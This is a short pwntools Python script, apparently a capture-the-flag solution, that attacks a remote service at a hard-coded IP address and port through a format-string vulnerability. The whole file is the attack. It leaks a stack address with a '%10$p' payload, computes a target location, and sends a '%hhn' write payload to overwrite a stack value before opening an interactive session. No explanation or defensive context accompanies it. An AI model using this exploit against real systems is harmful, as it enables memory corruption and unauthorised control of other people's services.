from pwn import *
context.log_level = 'DEBUG'

def p64(n):
    return pack(n, 64, 'little')

# p = process('./secret')
# gdb.attach(p, gdbscript=('b *0x0000000000400801\n'))
p = remote('140.110.112.221', 6131)
payload = b'%10$p' # leak_stack_address
p.recvuntil(b':')
# buffer locate on offset 8
p.sendline(payload)
stack_address = int(p.recvuntil(b'\n').strip(b'\n').split(b' ')[3].decode(),16)
stack_address = stack_address - 0x100 + 12
print(hex(stack_address))
p.recvuntil(b')')
# p.sendline(b'N')
# p.recvuntil(b':')
payload = b'%%55c%10$hhn' + b'B'*5 + p64(stack_address) # modify stack value b'%55c%10$hhn' + b'B'*5
p.sendline(payload)
#p.recvuntil(b')')
p.interactive()
